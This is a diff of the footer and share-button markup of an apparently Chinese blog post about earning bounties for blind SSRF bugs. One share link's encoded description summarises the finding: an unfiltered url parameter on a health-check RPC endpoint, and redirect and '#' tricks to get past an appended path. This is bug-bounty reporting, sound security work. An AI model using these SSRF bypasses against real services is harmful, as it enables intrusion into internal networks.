+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&is_video=false&description=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84&body=Check out this article: https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&title=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&title=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&name=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84&description=%e8%bf%99%e6%98%afhackerone%e4%b8%8a%e7%9a%84%e4%b8%80%e4%b8%aa%e7%a7%81%e4%ba%ba%e9%a1%b9%e7%9b%ae%0a%e7%ac%ac%e4%b8%80%e4%b8%aaBlind%20SSRF%20%e7%ac%ac%e4%b8%80%e4%b8%aaBlind%20SSRF%20%e4%bd%8d%e4%ba%8e%e9%82%80%e8%af%b7%e9%93%be%e6%8e%a5%e9%a1%b5%e9%9d%a2%3a%0ahttps%3a%2f%2fwww.target.com%2fgive-5-get-5%2fUOG262%20%e6%8c%82%e4%b8%8aburpsuite%e4%bd%9c%e4%b8%ba%e4%bb%a3%e7%90%86%ef%bc%8c%e7%9b%91%e6%8e%a7%e8%af%a5%e9%a1%b5%e9%9d%a2%e8%a7%a6%e5%8f%91%e7%9a%84%e6%89%80%e6%9c%89%e6%b5%81%e9%87%8f%ef%bc%8c%e5%8f%91%e7%8e%b0%e8%af%a5%e9%a1%b5%e9%9d%a2%e4%bc%9a%e5%8f%91%e9%80%81POST%e8%af%b7%e6%b1%82%e7%bb%99%20https%3a%2f%2fwww.target.com%2frpc%2furl-health-check-rpc%2fcheck%0a%e8%af%b7%e6%b1%82%e5%8f%82%e6%95%b0%e4%b8%ba%3a%0aurl%3dhttps%253A%252F%252Fwww.instagram.com%252Fp%252FBuMIheXHKsS%252F%26amp%3bsourceUrl%3dhttps%253A%252F%252Fwww.target.com%252Fgive-5-get-5%252FUOG262%20%e8%bf%94%e5%9b%9e%e7%9a%84%e5%93%8d%e5%ba%94%e4%b8%ba%3a%0a%7b%26%2334%3bresult%26%2334%3b%3anull%2c%26%2334%3boutput%26%2334%3b%3a%26%2334%3b%26%2334%3b%7d%20%e7%bb%8f%e8%bf%87%e6%b5%8b%e8%af%95%ef%bc%8c%e8%af%a5%e8%af%b7%e6%b1%82%e7%9a%84url%20%e5%8f%82%e6%95%b0%e5%ad%98%e5%9c%a8blind%20ssrf%20%e6%bc%8f%e6%b4%9e%0a%e4%bb%8e%e8%af%b7%e6%b1%82%e6%8a%a5%e6%96%87%e4%b8%ad%e5%8f%af%e4%bb%a5%e7%9c%8b%e5%88%b0%ef%bc%8c%e6%9c%8d%e5%8a%a1%e7%ab%af%e4%bc%9a%e8%87%aa%e5%8a%a8%e5%90%91URL%e7%9a%84%e6%9c%ab%e5%b0%be%e6%b7%bb%e5%8a%a0%2fembed%20%ef%bc%8c%e5%af%bc%e8%87%b4%e6%94%bb%e5%87%bb%e8%80%85%e6%97%a0%e6%b3%95%e5%ae%8c%e5%85%a8%e6%8e%a7%e5%88%b6URL%e7%9a%84path%e7%9a%84%e9%83%a8%e5%88%86%ef%bc%8c%e4%bd%86%e6%98%af%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95%e5%be%88%e5%a4%9a%ef%bc%9a%0a%20%e8%af%a5%e7%89%b9%e6%80%a7%e5%8f%af%e4%bb%a5%e9%80%9a%e8%bf%8730x%e9%87%8d%e5%ae%9a%e5%90%91%e7%bb%95%e8%bf%87%e3%80%82%20%e4%bd%bf%e7%94%a8%23%e5%b0%86%e8%bf%bd%e5%8a%a0%e7%9a%84%2fembed%20%e5%8f%98%e6%88%90%e9%94%9a%e7%82%b9%e9%83%a8%e5%88%86%20%20%e8%bf%99%e5%87%a0%e4%b9%8e%e6%98%af%e4%b8%80%e4%b8%aa%e5%85%a8%e7%9b%b2%e7%9a%84SSRF%e6%bc%8f%e6%b4%9e%ef%bc%9a%0a%20%e4%bc%bc%e4%b9%8e%e6%b2%a1%e6%9c%89%e4%bb%bb%e4%bd%95SSRF%20filter%e6%9d%a5%e6%a3%80%e6%9f%a5%e5%92%8c%e8%bf%87%e6%bb%a4%e7%94%a8%e6%88%b7%e8%be%93%e5%85%a5%e7%9a%84URL%ef%bc%8c%e4%b8%8d%e9%9c%80%e8%a6%81%e4%bb%bb%e4%bd%95%e7%bb%95%e8%bf%87%e3%80%82%20%e5%bc%82%e6%ad%a5%e8%af%b7%e6%b1%82%ef%bc%8c%e6%97%a0%e6%b3%95%e9%80%9a%e8%bf%87%e5%bb%b6%e6%97%b6%e6%9d%a5%e8%bf%9b%e8%a1%8c%e5%86%85%e7%bd%91%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%28XSPA%29%20%e6%b2%a1%e6%9c%89%e4%bb%bb%e4%bd%95%e5%9b%9e%e6%98%be%20%e4%b8%8d%e6%94%af%e6%8c%81gopher%e5%8d%8f%e8%ae%ae%ef%bc%8c%e4%b8%8d%e6%94%af%e6%8c%81file%e5%8d%8f%e8%ae%ae%20%e4%b8%8d%e5%ad%98%e5%9c%a8CRLF%e6%b3%a8%e5%85%a5%ef%bc%8c%e4%b8%8d%e8%83%bd%e8%b5%b0%e7%a7%81%e8%af%b7%e6%b1%82%e6%8a%a5%e6%96%87%20%e4%bc%9a%e8%b7%9f%e9%9a%8f30x%e9%87%8d%e5%ae%9a%e5%90%91%20%20%e6%89%80%e4%bb%a5%e5%8d%95%e7%ba%af%e5%88%a9%e7%94%a8%e8%af%a5SSRF%ef%bc%8c%e6%88%91%e4%bb%ac%e5%87%a0%e4%b9%8e%e6%97%a0%e6%b3%95%e7%9f%a5%e9%81%93%e8%87%aa%e5%b7%b1%e6%98%af%e5%90%a6%e6%88%90%e5%8a%9f%e6%89%93%e5%88%b0%e4%ba%86%e5%86%85%e7%bd%91%e3%80%82%0a%e4%bd%86%e6%98%af%e9%80%9a%e8%bf%87%e5%8f%8d%e8%bf%9e%e8%af%b7%e6%b1%82%ef%bc%8c%e6%88%91%e5%a4%a7%e7%ba%a6%e6%94%b6%e9%9b%86%e5%88%b05%e4%b8%aa%e4%b8%8d%e5%90%8c%e7%9a%84IP%e5%9c%b0%e5%9d%80%ef%bc%8c%e8%bf%99%e4%ba%9bIP%e5%9c%b0%e5%9d%80%e9%83%bd%e6%98%afAWS%e7%9a%84IP%e5%9c%b0%e5%9d%80%ef%bc%8c%e6%89%80%e4%bb%a5%e5%a4%a7%e8%87%b4%e5%8f%af%e4%bb%a5%e6%8e%a8%e6%96%ad%ef%bc%8c%e7%9b%ae%e6%a0%87%e7%ab%99%e7%82%b9%e9%83%a8%e7%bd%b2%e5%9c%a8AWS%e4%b8%8a%2c%e5%b9%b6%e4%b8%94%e4%bc%bc%e4%b9%8e%e5%81%9a%e4%ba%86%e8%b4%9f%e8%bd%bd%e5%9d%87%e8%a1%a1%0a%e6%88%91%e5%bc%80%e5%a7%8b%e6%8e%a8%e6%b5%8b%e4%b8%ba%e4%bb%80%e4%b9%88%e8%ae%bf%e9%97%ae%e8%af%a5%e9%a1%b5%e9%9d%a2%e4%bc%9a%e8%a7%a6%e5%8f%91%e4%b8%8a%e8%bf%b0POST%e8%af%b7%e6%b1%82%ef%bc%8c%e4%ba%8e%e6%98%af%e6%88%91%e5%ae%a1%e8%ae%a1%e4%ba%86%e8%bf%99%e4%b8%aa%e9%a1%b5%e9%9d%a2%e7%9a%84%e5%89%8d%e7%ab%af%e4%bb%a3%e7%a0%81%ef%bc%8c%e5%8f%91%e7%8e%b0%e8%af%a5%e9%a1%b5%e9%9d%a2%e4%bd%bf%e7%94%a8iframe%20%e5%b5%8c%e5%85%a5Instagram%e7%9a%84%e4%b8%80%e4%ba%9b%e9%a1%b5%e9%9d%a2%ef%bc%8c%e5%90%8c%e6%97%b6%e4%bd%bf%e7%94%a8js%e4%bb%a3%e7%a0%81%e6%9d%a5%e6%a3%80%e6%9f%a5%e8%bf%99%e4%ba%9bInstagram%e9%a1%b5%e9%9d%a2%e5%af%b9%e5%ba%94%e7%9a%84%e7%9a%84URL%e6%98%af%e5%90%a6health%20%ef%bc%8c%e7%9b%b8%e5%85%b3js%e4%bb%a3%e7%a0%81%e5%a6%82%e4%b8%8b%3a%0a%20RPC%28%26%2339%3burl-health-check%2fcheck%26%2339%3b%2c%20%7burl%3a%20%26%2334%3bhttps%3a%5c%2f%5c%2fwww.instagram.com%5c%2fp%5c%2fBuMIheXHKsS%5c%2f%26%2334%3b%2c%20sourceUrl%3a%20%26%2334%3bhttps%3a%5c%2f%5c%2fwww.target.com%5c%2fgive-5-get-5%5c%2fUOG262%26%2334%3b%7d%29%3b%20RPC%20%e6%98%af%e7%9b%ae%e6%a0%87%e7%ab%99%e7%82%b9%e5%b0%81%e8%a3%85%e5%a5%bd%e7%9a%84%e4%b8%80%e4%b8%aa%e7%94%a8%e6%9d%a5%e5%8f%91%e9%80%81http%e8%af%b7%e6%b1%82%e7%9a%84%e5%87%bd%e6%95%b0%0aconsole.log%28RPC%2b%26%2339%3b%26%2339%3b%29%20function%20RPC%28e%2c%20t%2c%20o%2c%20i%29%20%7b%20%20i%20%3d%20i%20%7c%7c%20%7b%7d%2c%20%20t%20%3d%20t%20%7c%7c%20%7b%7d%3b%20%20var%20s%20%3d%20e." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&t=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2022  无在无不在 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
